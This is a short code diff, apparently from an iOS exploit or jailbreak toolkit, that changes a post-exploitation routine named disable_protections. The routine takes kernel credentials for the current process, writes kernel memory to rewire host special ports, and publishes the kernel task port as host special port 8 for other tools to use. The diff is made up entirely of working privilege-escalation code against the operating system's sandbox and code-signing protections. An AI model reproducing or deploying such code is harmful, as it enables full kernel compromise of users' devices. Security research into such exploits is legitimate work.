@@ -104,7 +104,7 @@ void fix_launchd_after_sandbox_escape(mach_port_t real_service, mach_port_t mitm
 #define AMFID             "/usr/libexec/amfid"
 #define CONTAINERMANAGERD "/System/Library/PrivateFrameworks/MobileContainerManager.framework/Support/containermanagerd"
 
-void disable_protections(uint64_t realhost) {
+void disable_protections(mach_port_t host_priv_port, uint64_t realhost) {
   // Give ourselves the kernel credentials so that we can find processes.
   bool success = proc_copy_credentials(currentproc, kernproc);
   assert(success);
@@ -133,11 +133,14 @@ void disable_protections(uint64_t realhost) {
   uint64_t host_priv = rk64(realhost+0x20); // host special port 2
   wk64(realhost+0x18, host_priv); // host special 1
   
-  // while we're at it set the kernel task port as host special port 4 (an unused host special port)
+  // while we're at it set the kernel task port as host special port 8 (an unused host special port)
   // so other tools can get at it via host_get_special_port on the host_priv port
-  uint64_t kernel_task_port_ptr = proc_port_name_to_port_ptr(currentproc, kernel_task);
-  wk64(realhost+0x30, kernel_task_port_ptr);
-  printf("set the kernel task port as host special port 4\n");
+  kern_return_t kr = host_set_special_port(host_priv_port, 8, kernel_task);
+  if (kr == KERN_SUCCESS) {
+    printf("set the kernel task port as host special port 8\n");
+  } else {
+    printf("failed to set the kernel task port as host special port 8: %s\n", mach_error_string(kr));
+  }
 }
 
 void unsandbox_pid(pid_t target_pid) {
